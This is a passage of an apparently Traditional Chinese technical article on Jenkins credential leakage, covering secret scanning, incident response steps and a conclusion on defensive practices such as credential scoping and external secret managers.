    - 日誌中類似密碼的字串
    - Base64 編碼的憑證
    
    **配置掃描**
    - 掃描任務配置中的硬編碼機密
    - 檢查 Jenkins 中的管線定義
    - 稽核外掛配置
    - 審查全域 Jenkins 配置
    
    **工具和整合**
    - git-secrets 用於儲存庫掃描
    - truffleHog 用於憑證偵測
    - Jenkins 特定模式的自訂腳本
    - 與 CI/CD 管線整合以進行自動檢查

### 事件回應程序

為憑證外洩事件建立明確的程序：

!!!anote "🚨 事件回應步驟"
    **立即行動**
    1. 識別暴露的憑證及其範圍
    2. 立即輪換被入侵的憑證
    3. 審查存取日誌以查找未經授權的使用
    4. 如果無法輪換，則停用被入侵的帳戶
    
    **調查**
    1. 確定外洩持續時間和存取範圍
    2. 識別誰有權存取暴露的憑證
    3. 檢查未經授權存取的跡象
    4. 記錄時間軸和影響
    
    **補救**
    1. 修復外洩的根本原因
    2. 更新管線以防止再次發生
    3. 實施額外控制
    4. 對受影響的團隊進行安全培訓
    
    **事後**
    1. 記錄經驗教訓
    2. 更新安全程序
    3. 在組織內分享知識
    4. 安排後續審查

## 結論

Jenkins 憑證外洩代表現代 CI/CD 管線中的關鍵安全風險。使 Jenkins 強大的靈活性——Groovy 腳本、廣泛的外掛、詳細的日誌記錄——也創造了憑證洩漏的眾多途徑。從明顯的錯誤（如在建置日誌中回顯密碼）到外掛 API 中的細微漏洞，攻擊面廣泛且不斷演變。

最常見的外洩向量仍然是建置日誌，開發人員在除錯期間或透過詳細命令輸出無意中列印憑證。這些日誌預設情況下無限期保留，所有開發人員都可存取，並且經常被轉發到日誌聚合系統，使外洩倍增。腳本控制台提供管理權力，但也使任何有權存取的人都能直接提取憑證。API 端點可能透過任務配置、建置參數和外掛特定的漏洞暴露憑證。

常見的外洩情境展示了憑證保護不足的嚴重後果。具有預設安全設定的公開可存取 Jenkins 實例可能導致完全的基礎設施入侵。長期包含憑證的建置日誌使組織面臨需要大量稽核的未知風險。外掛漏洞可能影響數千個安裝，許多組織由於相容性問題而延遲應用修補程式。

保護需要多層防禦。安全管線實踐透過謹慎使用 `withCredentials` 區塊、停用命令回顯和避免憑證列印來最小化憑證外洩。憑證範圍透過限制哪些任務可以存取特定憑證來限制爆炸半徑。嚴格的存取控制和全面的稽核日誌記錄能夠偵測可疑活動。像 HashiCorp Vault 這樣的外部機密管理系統提供動態、短期憑證和集中控制，但它們不能消除透過日誌、artifact 或報告的外洩——無論機密儲存在哪裡，安全管線設計仍然至關重要。

偵測和回應能力同樣關鍵。自動掃描建置日誌和配置可以在攻擊者發現之前識別暴露的憑證。明確的事件回應程序確保快速輪換被入侵的憑證，並徹底調查潛在的未經授權存取。定期對 Jenkins 配置、外掛和管線進行安全稽核有助於在漏洞被利用之前識別它們。

「安全即程式碼」和基礎設施自動化的趨勢使 Jenkins 安全性變得越來越重要。隨著組織將更多憑證整合到 CI/CD 系統中，外洩的影響也在增長。最小權限原則應該指導每個憑證決策：使用資料夾範圍的憑證，為每個用例建立單獨的憑證，優先使用唯讀存取，並定期輪換。

在 Jenkins 中儲存憑證之前，問問自己：這個憑證需要在 Jenkins 中嗎，還是可以從外部機密管理器檢索？誰需要存取這個憑證，我可以更狹窄地限定範圍嗎？如果這個憑證被暴露，我將如何偵測？我的輪換策略是什麼？這些問題的答案應該指導你的憑證管理策略，並幫助防止 CI/CD 管線中的下一次憑證外洩事件。
